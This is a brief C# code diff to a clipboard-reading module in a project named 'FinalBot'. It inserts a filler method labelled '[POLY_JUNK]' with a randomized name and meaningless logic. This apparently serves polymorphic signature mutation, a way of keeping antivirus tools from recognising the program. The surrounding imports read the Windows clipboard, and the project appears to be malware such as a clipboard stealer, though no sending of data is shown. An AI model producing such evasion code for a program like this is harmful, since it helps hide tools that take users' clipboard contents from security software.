@@ -8,6 +8,12 @@ namespace FinalBot.Modules
 {
     public static class ClipboardModule
     {
+        // [POLY_JUNK]
+        private static void _vanguard_f43b10c0() {
+            int val = 51359;
+            if (val > 50000) Console.WriteLine("Hash:" + 51359);
+        }
+
         [DllImport("user32.dll")] static extern bool OpenClipboard(IntPtr hWnd);
         [DllImport("user32.dll")] static extern bool CloseClipboard();
         [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
